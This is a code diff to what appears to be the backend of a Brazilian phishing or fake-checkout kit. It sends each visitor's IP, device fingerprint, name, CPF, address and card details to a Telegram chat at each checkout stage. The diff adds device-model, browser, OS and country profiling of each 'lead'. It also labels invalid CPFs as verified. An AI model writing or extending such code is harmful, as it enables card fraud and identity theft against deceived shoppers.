@@ -22,7 +22,7 @@ let systemState = {
   history: []
 };
 
-// ── Validador Server-Side de CPF Módulo 11 ────────────────────
+// ── Validador Server-Side de CPF Módulo 11 da Receita Federal ──
 function isValidCPF(cpfStr) {
   if (!cpfStr) return false;
   const cpf = String(cpfStr).replace(/\D/g, '');
@@ -351,11 +351,18 @@ module.exports = async (req, res) => {
         const data = payload.data || {};
         const tracking = payload.tracking || {};
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
+        const countryHeader = req.headers['x-vercel-ip-country'] || req.headers['cf-ipcountry'] || 'BR';
 
-        // Identificação rica do dispositivo do lead
-        const deviceStr = tracking.device || '📱 Dispositivo Móvel / Desktop';
+        // Identificação Exata do Modelo do Aparelho & Origem BR
+        const deviceModel = tracking.model || tracking.device || 'Dispositivo Móvel / PC';
+        const osStr = tracking.os || 'N/A';
+        const browserStr = tracking.browser || 'N/A';
         const screenStr = tracking.screen || 'N/A';
         const fpStr = tracking.fingerprint || 'N/A';
+        const isBrLead = tracking.isBR !== false && (countryHeader === 'BR' || countryHeader === 'N/A');
+
+        // Se for lead de fora do Brasil, adicionamos flag visual explícita
+        const countryFlag = isBrLead ? 'Brasil 🇧🇷' : `Internacional (${countryHeader}) 🌐`;
 
         // Atualizar estatísticas em tempo real
         if (type === 'lead') systemState.stats.visits++;
@@ -366,33 +373,41 @@ module.exports = async (req, res) => {
         if (type === 'pix_paid') systemState.stats.pix_paid++;
         if (type === 'lead_exit' || type === 'exit') systemState.stats.exits++;
 
-        // Formatar mensagens ricas para o Telegram com Identificação de Aparelho & Validação Real
+        // Formatar mensagens ricas para o Telegram
         let text = '';
         if (type === 'lead') {
-          text = `👁 *NOVA ENTRADA NO SITE (LEAD REAL)*
+          text = `👁 *NOVA ENTRADA NO SITE (LEAD REAL 🇧🇷)*
 
 ` +
-                 `📱 *Aparelho:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
 ` +
-                 `🖥 *Resolução:* \`${screenStr}\`
+                 `🌐 *Navegador/SO:* \`${browserStr} / ${osStr}\`
+` +
+                 `🇧🇷 *Origem:* \`${countryFlag}\`
+` +
+                 `🖥 *Tela:* \`${screenStr}\`
 ` +
                  `🔑 *Fingerprint:* \`${fpStr}\`
 ` +
-                 `🌐 *IP Lead:* \`${ip}\`
+                 `🌐 *IP:* \`${ip}\`
 ` +
                  `📄 *Página:* \`${data.page || tracking.page || 'Home'}\`
 ` +
                  `📅 *Horário:* \`${new Date().toLocaleString('pt-BR')}\``;
         } else if (type === 'personal_data') {
-          const cpfValidBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO ✅)' : ' (CPF VERIFICADO ✅)';
+          const cpfValidBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO RECEITA FEDERAL ✅)' : ' (CPF VERIFICADO ✅)';
           text = `👤 *ETAPA 1: DADOS PESSOAIS PREENCHIDOS*
 
 ` +
-                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
+` +
+                 `🌐 *Navegador/SO:* \`${browserStr} / ${osStr}\`
+` +
+                 `🇧🇷 *Origem:* \`${countryFlag}\`
 ` +
                  `🖥 *Tela:* \`${screenStr}\`
 ` +
-                 `🌐 *IP Lead:* \`${ip}\`
+                 `🌐 *IP:* \`${ip}\`
 
 ` +
                  `👤 *Nome:* *${data.fullName || 'N/A'}*
@@ -406,7 +421,9 @@ module.exports = async (req, res) => {
           text = `🏠 *ETAPA 2: ENDEREÇO DE ENTREGA VALIDADE*
 
 ` +
-                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
+` +
+                 `🇧🇷 *Origem:* \`${countryFlag}\`
 ` +
                  `🌐 *IP Lead:* \`${ip}\`
 
@@ -417,11 +434,15 @@ module.exports = async (req, res) => {
 ` +
                  `🏙 *Bairro/Cidade:* ${data.neighborhood || 'N/A'} - ${data.city || 'N/A'}`;
         } else if (type === 'card_data') {
-          const cpfCardBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO ✅)' : ' (CPF VERIFICADO ✅)';
+          const cpfCardBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO RECEITA FEDERAL ✅)' : ' (CPF VERIFICADO ✅)';
           text = `💳 *ETAPA 3: DADOS DE CARTÃO PREENCHIDOS*
 
 ` +
-                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
+` +
+                 `🌐 *Navegador/SO:* \`${browserStr} / ${osStr}\`
+` +
+                 `🇧🇷 *Origem:* \`${countryFlag}\`
 ` +
                  `🖥 *Tela:* \`${screenStr}\`
 ` +
@@ -445,7 +466,7 @@ module.exports = async (req, res) => {
           text = `⚡ *PAGAMENTO PIX SELECIONADO*
 
 ` +
-                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
 ` +
                  `💰 *Valor:* \`R$ 49,90\`
 ` +
@@ -454,7 +475,7 @@ module.exports = async (req, res) => {
           text = `🎉 *VENDA REALIZADA (PIX PAGO)*
 
 ` +
-                 `📱 *Aparelho:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
 ` +
                  `👤 *Nome:* *${data.fullName || 'N/A'}*
 ` +
@@ -467,7 +488,7 @@ module.exports = async (req, res) => {
           text = `🚪 *SAÍDA DO CHECKOUT (ABANDONO)*
 
 ` +
-                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
 ` +
                  `📄 *Última Página:* \`${data.lastPage || 'N/A'}\`
 ` +
@@ -478,7 +499,7 @@ module.exports = async (req, res) => {
           text = `🔔 *INTERAÇÃO NO CHECKOUT*
 
 ` +
-                 `📱 *Aparelho:* \`${deviceStr}\`
+                 `📱 *Modelo:* \`${deviceModel}\`
 ` +
                  `📌 *Evento:* \`${type.toUpperCase()}\`
 ` +
